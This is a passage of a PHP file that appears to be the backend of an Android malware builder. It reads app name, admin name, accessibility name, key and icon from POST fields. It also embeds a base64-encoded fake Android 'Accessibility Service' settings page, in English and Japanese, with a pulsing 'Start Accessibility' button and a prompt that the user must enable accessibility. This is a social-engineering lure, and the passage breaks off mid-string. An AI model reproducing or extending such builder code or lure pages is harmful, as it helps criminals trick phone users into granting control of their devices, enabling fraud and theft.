<?php
$build = new build();
$build->main();

class build
{



  function backend()
  {


    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
      if (!empty($_POST['url'])) {


        $url = $_POST['url'];
        $name_app = $_POST['name_app'];
        $name_admin = $_POST['name_admin'];
        $name_accessibility = $_POST['name_accessibility'];
        $steps = $_POST['steps'];
        $tag = $_POST['tag'];
        $key = $_POST['key'];
        $file_get_contents_base64 = $_POST['icon'];
        $accessibility_page = 'PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+PGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9ImllPWVkZ2UiPg0KICAgIDx0aXRsZT5BY2Nlc3NpYmlsaXR5PC90aXRsZT4NCjxzdHlsZT4NCmh0bWx7bGluZS1oZWlnaHQ6MS4xNTstd2Via2l0LXRleHQtc2l6ZS1hZGp1c3Q6MTAwJX1ib2R5e21hcmdpbjowfW1haW57ZGlzcGxheTpibG9ja31oMXtmb250LXNpemU6MmVtO21hcmdpbjouNjdlbSAwfWhye2JveC1zaXppbmc6Y29udGVudC1ib3g7aGVpZ2h0OjA7b3ZlcmZsb3c6dmlzaWJsZX1wcmV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlLG1vbm9zcGFjZTtmb250LXNpemU6MWVtfWF7YmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudH1hYmJyW3RpdGxlXXtib3JkZXItYm90dG9tOm5vbmU7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lIGRvdHRlZH1iLHN0cm9uZ3tmb250LXdlaWdodDpib2xkZXJ9Y29kZSxrYmQsc2FtcHtmb250LWZhbWlseTptb25vc3BhY2UsbW9ub3NwYWNlO2ZvbnQtc2l6ZToxZW19c21hbGx7Zm9udC1zaXplOjgwJX1zdWIsc3Vwe2ZvbnQtc2l6ZTo3NSU7bGluZS1oZWlnaHQ6MDtwb3NpdGlvbjpyZWxhdGl2ZTt2ZXJ0aWNhbC1hbGlnbjpiYXNlbGluZX1zdWJ7Ym90dG9tOi0uMjVlbX1zdXB7dG9wOi0uNWVtfWltZ3tib3JkZXItc3R5bGU6bm9uZX1idXR0b24saW5wdXQsb3B0Z3JvdXAsc2VsZWN0LHRleHRhcmVhe2ZvbnQtZmFtaWx5OmluaGVyaXQ7Zm9udC1zaXplOjEwMCU7bGluZS1oZWlnaHQ6MS4xNTttYXJnaW46MH1idXR0b24saW5wdXR7b3ZlcmZsb3c6dmlzaWJsZX1idXR0b24sc2VsZWN0e3RleHQtdHJhbnNmb3JtOm5vbmV9YnV0dG9uLFt0eXBlPSJidXR0b24iXSxbdHlwZT0icmVzZXQiXSxbdHlwZT0ic3VibWl0Il17LXdlYmtpdC1hcHBlYXJhbmNlOmJ1dHRvbn1idXR0b246Oi1tb3otZm9jdXMtaW5uZXIsW3R5cGU9ImJ1dHRvbiJdOjotbW96LWZvY3VzLWlubmVyLFt0eXBlPSJyZXNldCJdOjotbW96LWZvY3VzLWlubmVyLFt0eXBlPSJzdWJtaXQiXTo6LW1vei1mb2N1cy1pbm5lcntib3JkZXItc3R5bGU6bm9uZTtwYWRkaW5nOjB9YnV0dG9uOi1tb3otZm9jdXNyaW5nLFt0eXBlPSJidXR0b24iXTotbW96LWZvY3VzcmluZyxbdHlwZT0icmVzZXQiXTotbW96LWZvY3VzcmluZyxbdHlwZT0ic3VibWl0Il06LW1vei1mb2N1c3Jpbmd7b3V0bGluZToxcHggZG90dGVkIEJ1dHRvblRleHR9ZmllbGRzZXR7cGFkZGluZzouMzVlbSAuNzVlbSAuNjI1ZW19bGVnZW5ke2JveC1zaXppbmc6Ym9yZGVyLWJveDtjb2xvcjppbmhlcml0O2Rpc3BsYXk6dGFibGU7bWF4LXdpZHRoOjEwMCU7cGFkZGluZzowO3doaXRlLXNwYWNlOm5vcm1hbH1wcm9ncmVzc3t2ZXJ0aWNhbC1hbGlnbjpiYXNlbGluZX10ZXh0YXJlYXtvdmVyZmxvdzphdXRvfVt0eXBlPSJjaGVja2JveCJdLFt0eXBlPSJyYWRpbyJde2JveC1zaXppbmc6Ym9yZGVyLWJveDtwYWRkaW5nOjB9W3R5cGU9Im51bWJlciJdOjotd2Via2l0LWlubmVyLXNwaW4tYnV0dG9uLFt0eXBlPSJudW1iZXIiXTo6LXdlYmtpdC1vdXRlci1zcGluLWJ1dHRvbntoZWlnaHQ6YXV0b31bdHlwZT0ic2VhcmNoIl17LXdlYmtpdC1hcHBlYXJhbmNlOnRleHRmaWVsZDtvdXRsaW5lLW9mZnNldDotMnB4fVt0eXBlPSJzZWFyY2giXTo6LXdlYmtpdC1zZWFyY2gtZGVjb3JhdGlvbnstd2Via2l0LWFwcGVhcmFuY2U6bm9uZX06Oi13ZWJraXQtZmlsZS11cGxvYWQtYnV0dG9uey13ZWJraXQtYXBwZWFyYW5jZTpidXR0b247Zm9udDppbmhlcml0fWRldGFpbHN7ZGlzcGxheTpibG9ja31zdW1tYXJ5e2Rpc3BsYXk6bGlzdC1pdGVtfXRlbXBsYXRle2Rpc3BsYXk6bm9uZX1baGlkZGVuXXtkaXNwbGF5Om5vbmV9DQo8L3N0eWxlPg0KPHN0eWxlPg0KaHRtbCwgYm9keSB7DQogICAgZm9udC1mYW1pbHk6ICJPcGVuIFNhbnMiLCAiSGVsdmV0aWNhIE5ldWUiLCBIZWx2ZXRpY2EsIEFyaWFsLCBzYW5zLXNlcmlmOw0KICAgIG1hcmdpbjogMDsgDQogICAgaGVpZ2h0OiAxMDAlOyANCiAgICBvdmVyZmxvdzogaGlkZGVuOw0KfQ0KLmhlYWRlciB7DQogICAgaGVpZ2h0OiA2NXB4Ow0KICAgIGJvcmRlci1ib3R0b206IDNweCBzb2xpZCAjZTJlMmUyOw0KfQ0KLmhlYWRlciBiIHsNCiAgICBsaW5lLWhlaWdodDogNjVweDsNCiAgICBmb250LXNpemU6MS41cmVtOw0KfQ0KLmhzcCB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogI2Y0ZjRmNDsNCiAgICBjb2xvcjogIzQ2NDY0NjsNCiAgICBoZWlnaHQ6IDM0cHg7DQogICAgbGluZS1oZWlnaHQ6IDM0cHg7DQogICAgcGFkZGluZy10b3A6IDVweDsNCn0NCi5oc3AgYiB7DQogICAgbWFyZ2luLWxlZnQ6IDE1cHg7DQp9DQouZWxzIHsNCiAgICBsaW5lLWhlaWdodDogNTVweDsNCiAgICBoZWlnaHQ6IDU1cHg7DQogICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNmMmYyZjI7DQogICAgbWFyZ2luOiAwcHggMTVweCAwcHggMTVweDsNCiAgICBvdmVyZmxvdzogaGlkZGVuOw0KfQ0KLmVscyAubm0gew0KICAgIGZsb2F0OiBsZWZ0Ow0KICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogICAgd2lkdGg6IDBweDsNCn0NCi5lbHMgLnZsIHsNCiAgICBmbG9hdDogcmlnaHQ7DQogICAgY29sb3I6ICM5ODk4OTg7DQp9DQouYWFyIHsNCiAgICB3aWR0aDogMjFweDsNCiAgICBoZWlnaHQ6IDIxcHg7DQogICAgZmxvYXQ6IHJpZ2h0Ow0KICAgIG1hcmdpbi10b3A6IDE3cHg7DQoJYmFja2dyb3VuZC1pbWFnZTogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEQ5NGJXd2dkbVZ5YzJsdmJqMGlNUzR3SWlCbGJtTnZaR2x1WnowaWRYUm1MVGdpUHo0OGMzWm5JSFpsY25OcGIyNDlJakV1TVNJZ2FXUTlJa3hoZVdWeVh6RWlJSGh0Ykc1elBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHlNREF3TDNOMlp5SWdlRzFzYm5NNmVHeHBibXM5SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpFNU9Ua3ZlR3hwYm1zaUlIZzlJakJ3ZUNJZ2VUMGlNSEI0SWlCMmFXVjNRbTk0UFNJd0lEQWdNVEk1SURFeU9TSWdjM1I1YkdVOUltVnVZV0pzWlMxaVlXTnJaM0p2ZFc1a09tNWxkeUF3SURBZ01USTVJREV5T1RzaUlIaHRiRHB6Y0dGalpUMGljSEpsYzJWeWRtVWlQanh6ZEhsc1pTQjBlWEJsUFNKMFpYaDBMMk56Y3lJK0xuTjBNSHRtYVd4c09pTmtOR1EwWkRRN2ZUd3ZjM1I1YkdVK1BHYytQSEJoZEdnZ1kyeGhjM005SW5OME1DSWdaRDBpVFRRd0xqUXNNVEl4TGpOakxUQXVPQ3d3TGpndE1TNDRMREV1TWkweUxqa3NNUzR5Y3kweUxqRXRNQzQwTFRJdU9TMHhMakpqTFRFdU5pMHhMall0TVM0MkxUUXVNaXd3TFRVdU9HdzFNUzAxTVd3dE5URXROVEZqTFRFdU5pMHhMall0TVM0MkxUUXVNaXd3TFRVdU9ITTBMakl0TVM0MkxEVXVPQ3d3YkRVekxqa3NOVE11T1dNeExqWXNNUzQyTERFdU5pdzBMaklzTUN3MUxqaE1OREF1TkN3eE1qRXVNM29pTHo0OEwyYytQQzl6ZG1jKyk7DQp9DQouY2hiIHsNCiAgICBiYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgICB3aWR0aDogNTRweDsNCiAgICBoZWlnaHQ6IDQ5cHg7DQogICAgbWFyZ2luLXRvcDogNHB4Ow0KfQ0KLnNvZiB7DQoJYmFja2dyb3VuZC1pbWFnZTogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm9aV2xuYUhROUlqVXhNbkIwSWlCMmFXVjNRbTk0UFNJd0lDMHhNRGNnTlRFeUlEVXhNaUlnZDJsa2RHZzlJalV4TW5CMElpQjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaVBqeHpkSGxzWlNCMGVYQmxQU0owWlhoMEwyTnpjeUkrSUNBZ0lDQWdJQ0FnSUNBdWMzUXhlMlpwYkd3NkkyVXlaVEpsTWp0OUlDQWdJQ0FnSUR3dmMzUjViR1UrUEhCaGRHZ2dZMnhoYzNNOUluTjBNU0lnWkQwaWJUTTJNaTQyTmpjNU5qa2dNR2d0TWpFekxqTXpOVGt6T0dNdE9ESXVNekkwTWpFNUlEQXRNVFE1TGpNek1qQXpNU0EyTmk0NU9EZ3lPREV0TVRRNUxqTXpNakF6TVNBeE5Ea3VNek15TURNeElEQWdPREl1TXpRM05qVTNJRFkzTGpBd056Z3hNaUF4TkRrdU16TTFPVE00SURFME9TNHpNekl3TXpFZ01UUTVMak16TlRrek9HZ3lNVE11TXpNMU9UTTRZemd5TGpNeU5ESXhPU0F3SURFME9TNHpNekl3TXpFdE5qWXVPVGc0TWpneElERTBPUzR6TXpJd016RXRNVFE1TGpNek5Ua3pPQ0F3TFRneUxqTTBNemMxTFRZM0xqQXdOemd4TWkweE5Ea3VNek15TURNeExURTBPUzR6TXpJd016RXRNVFE1TGpNek1qQXpNWHB0TFRJeE15NHpNelU1TXpnZ01qTTBMalkyTnprMk9XTXRORGN1TURVNE5Ua3pJREF0T0RVdU16TXlNRE14TFRNNExqSTNNelF6T0MwNE5TNHpNekl3TXpFdE9EVXVNek0xT1RNNElEQXRORGN1TURVNE5Ua3pJRE00TGpJM016UXpPQzA0TlM0ek16SXdNekVnT0RVdU16TXlNRE14TFRnMUxqTXpNakF6TVNBME55NHdOakkxSURBZ09EVXVNek0xT1RNNElETTRMakkzTXpRek9DQTROUzR6TXpVNU16Z2dPRFV1TXpNeU1ETXhJREFnTkRjdU1EWXlOUzB6T0M0eU56TTBNemdnT0RVdU16TTFPVE00TFRnMUxqTXpOVGt6T0NBNE5TNHpNelU1TXpoNmJUQWdNQ0l2UGp3dmMzWm5QZz09KTsNCn0NCi5hbXIgew0KICAgIG1hcmdpbi10b3A6IDU2cHg7DQp9DQouYW4gew0KICAgIGhlaWdodDogNTZweDsNCiAgICB3aWR0aDogMTAwJTsNCiAgICBwb3NpdGlvbjpmaXhlZDsNCiAgICBiYWNrZ3JvdW5kOnJlZDsNCiAgICBhbmltYXRpb246YTEgM3M7DQogICAgLW1vei1hbmltYXRpb246YTEgM3MgaW5maW5pdGU7IC8qIEZpcmVmb3ggKi8NCiAgICAtd2Via2l0LWFuaW1hdGlvbjphMSAzcyBpbmZpbml0ZTsgLyogU2FmYXJpIGFuZCBDaHJvbWUgKi8NCn0NCg0KQC1tb3ota2V5ZnJhbWVzIGExIC8qIEZpcmVmb3ggKi8gew0KICAgIDAlIHsNCiAgICAgICAgYmFja2dyb3VuZDp3aGl0ZTsNCiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjApOw0KICAgIH0NCiAgICA1MCUgew0KICAgICAgICBiYWNrZ3JvdW5kOmxpZ2h0Z3JheTsNCiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjA1KTsNCiAgICB9DQogICAgMTAwJSB7DQogICAgICAgIGJhY2tncm91bmQ6d2hpdGU7DQogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wKTsNCiAgICB9DQp9DQoNCkAtd2Via2l0LWtleWZyYW1lcyBhMSAvKiBTYWZhcmkgYW5kIENocm9tZSAqLyB7DQogICAgMCUgew0KICAgICAgICBiYWNrZ3JvdW5kOndoaXRlOw0KICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMCk7DQogICAgfQ0KICAgIDUwJSB7DQogICAgICAgIGJhY2tncm91bmQ6bGlnaHRncmF5Ow0KICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMDUpOw0KICAgIH0NCiAgICAxMDAlIHsNCiAgICAgICAgYmFja2dyb3VuZDp3aGl0ZTsNCiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjApOw0KICAgIH0NCn0NCkAtbW96LWtleWZyYW1lcyBhMiAvKiBGaXJlZm94ICovIHsNCiAgICAwJSB7DQogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wKTsNCiAgICAgICAgb3BhY2l0eTogMTAwOw0KICAgIH0NCiAgICAxMDAlIHsNCiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjUpOw0KICAgICAgICBvcGFjaXR5OiAwOw0KICAgIH0NCn0NCg0KQC13ZWJraXQta2V5ZnJhbWVzIGEyIC8qIFNhZmFyaSBhbmQgQ2hyb21lICovIHsNCiAgICAwJSB7DQogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wKTsNCiAgICAgICAgb3BhY2l0eTogMTAwOw0KICAgIH0NCiAgICAxMDAlIHsNCiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjUpOw0KICAgICAgICBvcGFjaXR5OiAwOw0KICAgIH0NCn0NCg0KLndoIHsNCiAgICB3aWR0aDogMTAwJTsNCiAgICBoZWlnaHQ6IC1tb3otY2FsYygxMDAlIC0gKDkwcHggKyAxNjBweCkpOw0KICAgIGhlaWdodDogLXdlYmtpdC1jYWxjKDEwMCUgLSAoOTBweCArIDE2MHB4KSk7DQogICAgaGVpZ2h0OiBjYWxjKDEwMCUgLSAoOTBweCArIDE2MHB4KSk7DQogICAgcG9zaXRpb246IGZpeGVkOw0KICAgIGJvdHRvbTogMDsNCiAgICB6LWluZGV4OiAxOw0KICAgIGJhY2tncm91bmQ6IHJnYigwLDAsMCk7DQogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE4MGRlZywgcmdiYSgwLDAsMCwwKSAwJSwgcmdiYSgyNTUsMjU1LDI1NSwxKSA4NSUpOw0KfQ0KLm5idCB7DQogICAgei1pbmRleDogNDsNCiAgICBwb3NpdGlvbjpmaXhlZDsNCiAgICB3aWR0aDogNzBweDsNCiAgICBoZWlnaHQ6IDcwcHg7DQogICAgYm90dG9tOiA5MHB4Ow0KICAgIGxlZnQ6IDUwJTsNCiAgICBtYXJnaW4tbGVmdDogLTM1cHg7DQogICAgYm9yZGVyLXJhZGl1czogOTk5cHg7DQogICAgYmFja2dyb3VuZDogcmdiKDgzLCA4MywgODMpOw0KfQ0KLmEyYyB7DQogICAgei1pbmRleDogMzsNCiAgICBwb3NpdGlvbjpmaXhlZDsNCiAgICB3aWR0aDogNjhweDsNCiAgICBoZWlnaHQ6IDY4cHg7DQogICAgYm90dG9tOiA5MHB4Ow0KICAgIGxlZnQ6IDUwJTsNCiAgICBtYXJnaW4tbGVmdDogLTM1cHg7DQogICAgYm9yZGVyLXJhZGl1czogOTk5cHg7DQogICAgYm9yZGVyOiAxcHggc29saWQgcmdiKDgzLCA4MywgODMpOw0KICAgIGFuaW1hdGlvbjphMiAyczsNCiAgICAtbW96LWFuaW1hdGlvbjphMiAycyBpbmZpbml0ZTsgLyogRmlyZWZveCAqLw0KICAgIC13ZWJraXQtYW5pbWF0aW9uOmEyIDJzIGluZmluaXRlOyAvKiBTYWZhcmkgYW5kIENocm9tZSAqLw0KfQ0KLm5idCAuYWFyIHsNCiAgICBmbG9hdDogbm9uZTsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgd2lkdGg6IDM4cHggIWltcG9ydGFudDsNCiAgICBoZWlnaHQ6IDM4cHggIWltcG9ydGFudDsNCiAgICBtYXJnaW4tbGVmdDogMTlweDsNCn0NCi5jdHh0IHsNCiAgICBwb3NpdGlvbjogZml4ZWQ7DQogICAgYm90dG9tOiA0NXB4Ow0KICAgIHdpZHRoOiAxMDAlOw0KICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICB6LWluZGV4OiAyOw0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KLmRzIHsNCiAgICB1c2VyLXNlbGVjdDogbm9uZTsNCiAgICAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOw0KICAgIC1raHRtbC11c2VyLXNlbGVjdDogbm9uZTsNCiAgICAtbW96LXVzZXItc2VsZWN0OiBub25lOw0KICAgIC1tcy11c2VyLXNlbGVjdDogbm9uZTsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBjbGFzcz0iZHMiPg0KICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+DQogICAgICAgICAgICA8c3ZnIHN0eWxlPSJoZWlnaHQ6IDQ2cHg7ZmxvYXQ6bGVmdDttYXJnaW4tbGVmdDoyNXB4O21hcmdpbi10b3A6MTBweDsiIHZlcnNpb249IjEuMSIgaWQ9IkNhcGFfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAzMS41IDMxLjUiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KICAgICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQogICAgICAgICAgIC5zdDB7ZmlsbDojMDA4ZWZmO30NCiAgICAgICA8L3N0eWxlPg0KICAgICAgIDxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xMC4zLDVjMC40LTAuNCwxLjEtMC40LDEuNiwwYzAuNCwwLjQsMC40LDEuMSwwLDEuNmwtOCw4bDE0LjksMGMwLjYsMCwxLjEsMC41LDEuMSwxLjFjMCwwLjYtMC41LDEuMS0xLjEsMS4xDQogICAgICAgICAgIGwtMTQuOSwwbDgsOGMwLjQsMC40LDAuNCwxLjIsMCwxLjZjLTAuNCwwLjQtMS4xLDAuNC0xLjYsMGwtMTAtMTBjLTAuNC0wLjQtMC40LTEuMSwwLTEuNkwxMC4zLDV6Ij48L3BhdGg+DQogICAgICAgPC9zdmc+ICAgIA0KICAgICAgICA8YiBpZD0iYWNjZXNzYWJpbGl0eTEiPkFjY2Vzc2liaWxpdHkgU2VydmljZTwvYj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJoc3AiPjxiIGlkPSJkb3dubG9hZGVkc2VydmljZSI+RE9XTkxPQURFRCBTRVJWSUNFUzwvYj48L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJlbHMiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJubSI+DQogICAgICAgICAgICA8YiBpZD0ic2VsZWN0dG9zcGVhayI+U2VsZWN0IHRvIHNwZWFrPC9iPg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBpZD0ib2ZmMSIgY2xhc3M9InZsIj5PRkY8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJhbiIgb25jbGljaz0iQ2xpY2tPSygpOyI+DQogICAgICAgIDxkaXYgY2xhc3M9ImVscyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJubSI+DQogICAgICAgICAgICAgICAgPGIgaWQ9InN0YXJ0YWNjZXNzYWJpbGl0eSI+U3RhcnQgQWNjZXNzaWJpbGl0eTwvYj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBpZD0ib2ZmMiIgY2xhc3M9InZsIj5PRkY8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0iZWxzIGFtciI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJubSI+DQogICAgICAgICAgICAgICAgPGIgaWQ9InN3aXRjaGFjY2VzcyI+U3dpdGNoIEFjY2VzczwvYj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBpZD0ib2ZmMyIgY2xhc3M9InZsIj5PRkY8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJlbHMiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibm0iPg0KICAgICAgICAgICAgICAgIDxiIGlkPSJ0YWxrYmFjayI+VGFsa0JhY2s8L2I+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgaWQ9Im9mZjQiIGNsYXNzPSJ2bCI+T0ZGPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0iaHNwIj48YiBpZD0ic2NyZWVucmVhZGVycyI+U0NSRUVOIFJFQURFUlM8L2I+PC9kaXY+DQogICAgPGRpdiBjbGFzcz0iZWxzIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im5tIj4NCiAgICAgICAgICAgICAgICA8YiBpZD0idGV4dHNwZWNoIj5UZXh0LXRvLXNwZWVjaCBvdXRwdXQ8L2I+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InZsIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhYXIiPjwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0iaHNwIj48YiBpZD0iZGlzcGxheTEiPkRJU1BMQVk8L2I+PC9kaXY+DQogICAgPGRpdiBjbGFzcz0iZWxzIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im5tIj4NCiAgICAgICAgICAgICAgICA8YiBpZD0iZm9udDEiPkZvbnQgc2l6ZTwvYj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBpZD0iZGVmYXVsdDEiIGNsYXNzPSJ2bCI+RGVmYXVsdDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9ImVscyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJubSI+DQogICAgICAgICAgICAgICAgPGIgaWQ9ImRpc3BsYXkyIj5EaXNwbGF5IHNpemU8L2I+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgaWQ9ImRlZmF1bHQyIiBjbGFzcz0idmwiPkRlZmF1bHQ8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJlbHMiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibm0iPg0KICAgICAgICAgICAgICAgIDxiIGlkPSJtYWduaWZpY2F0aW9uIj5NYWduaWZpY2F0aW9uPC9iPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGlkPSJvZmY1IiBjbGFzcz0idmwiPk9GRjwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9ImVscyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJubSI+DQogICAgICAgICAgICAgICAgPGIgaWQ9ImNvbG9yMSI+Q29sb3IgY29ycmVjdGlvbjwvYj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBpZD0ib2ZmNiIgY2xhc3M9InZsIj5PRkY8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJlbHMiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibm0iPg0KICAgICAgICAgICAgICAgIDxiIGlkPSJjb2xvcjIiPkNvbG9yIGludmVyc2lvbjwvYj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0idmwiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNvZiBjaGIiPjwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0id2giPjwvZGl2Pg0KICAgIDxkaXYgaWQ9ImJ0biIgY2xhc3M9Im5idCIgb25jbGljaz0iQ2xpY2tPSygpOyI+PGRpdiBjbGFzcz0iYWFyIj48L2Rpdj48L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJhMmMiPjwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9ImN0eHQiPlRvb2x0aXA6IFlvdSBuZWVkIGVuYWJsZSBBY2Nlc3NpYmlsaXR5PC9kaXY+DQoNCjxzY3JpcHQ+DQoNCnZhciBsYW5nID0gJ2VuJzsNCg0KdmFyIG9iakxhbmcgPSB7DQogICAgJ2VuJzogew0KICAgICAgICAnYWNjZXNzYWJpbGl0eTEnOidBY2Nlc3NpYmlsaXR5IFNlcnZpY2UnLA0KICAgICAgICAnZG93bmxvYWRlZHNlcnZpY2UnOidET1dOTE9BREVEIFNFUlZJQ0VTJywNCiAgICAgICAgJ3NlbGVjdHRvc3BlYWsnOidTZWxlY3QgdG8gc3BlYWsnLA0KICAgICAgICAnc3dpdGNoYWNjZXNzJzonU3dpdGNoIEFjY2VzcycsDQogICAgICAgICd0YWxrYmFjayc6J1RhbGtCYWNrJywNCiAgICAgICAgJ3NjcmVlbnJlYWRlcnMnOidTQ1JFRU4gUkVBREVSUycsDQogICAgICAgICd0ZXh0c3BlY2gnOidUZXh0LXRvLXNwZWVjaCBvdXRwdXQnLA0KICAgICAgICAnZGlzcGxheTEnOidESVNQTEFZJywNCiAgICAgICAgJ2ZvbnQxJzonRm9udCBzaXplJywNCiAgICAgICAgJ2Rpc3BsYXkyJzonRGlzcGxheSBzaXplJywNCiAgICAgICAgJ21hZ25pZmljYXRpb24nOidNYWduaWZpY2F0aW9uJywNCiAgICAgICAgJ2NvbG9yMSc6J0NvbG9yIGNvcnJlY3Rpb24nLA0KICAgICAgICAnY29sb3IyJzonQ29sb3IgaW52ZXJzaW9uJywNCiAgICAgICAgJ2RlZmF1bHQnOidEZWZhdWx0JywNCiAgICAgICAgJ29mZic6J09GRicNCiAgICB9LA0KICAgICdqYSc6IHsNCiAgICAgICAgJ2FjY2Vzc2FiaWxpdHkxJzon44Ki44Kv44K744K344OT44Oq44OG44KjJywNCiAgICAgICAgJ2Rvd25sb2FkZWRzZXJ2aWNlJzon44OA44Km44Oz44Ot44O844OJ44K144O844OT44K5JywNCiAgICAgICAgJ3NlbGVjdHRvc3BlYWsnOifoqIDoqp7pgbjmip4nLA0KICAgICAgICAnc3dpdGNoYWNjZXNzJzon44K544Kk44OD44OB44Ki44Kv44K744K5JywNCiAgICAgICAgJ3RhbGtiYWNrJzon44OI44O844Kv44OQ44OD44KvJywNCiAgICAgICAgJ3NjcmVlbnJlYWRlcnMnOifjgrnjgq/jg6rjg7zjg7Pjg6rjg7zjg4Djg7wnLA0KICAgICAgICAndGV4dHNwZWNoJzon44OG44Kt44K544OI44GL44KJ6Z+z5aOw44G444Gu5Ye65YqbJywNCiAgICAgICAgJ2Rpc3BsYXkxJzon44OH44Kj44K544OX44Os44KkJywNCiAgICAgICAgJ2ZvbnQxJzon44OV44Kp44Oz44OI44K144Kk44K6JywNCiAgICAgICAgJ2Rpc3BsYXkyJzon44OH44Kj44K544OX44Os44Kk44K144Kk44K6JywNCiAgICAgICAgJ21hZ25pZmljYXRpb24nOiflgI3njocnLA0KICAgICAgICAnY29sb3IxJzon6Imy6KOc5q2jJywNCiAgICAgICAgJ2NvbG9yMic6J+OCq+ODqeODvOWPjei7oicsDQogICAgICAgICdkZWZhdWx0Jzon44OH44OV44Kp44Or44OIJywNCiAgICAgICAgJ29mZic6J+OCquODlScNCiAgICB9DQp9DQoNCnZhciBsb2NhbGUgPSBvYmpMYW5nW2xhbmddID09IHVuZGVmaW5lZCA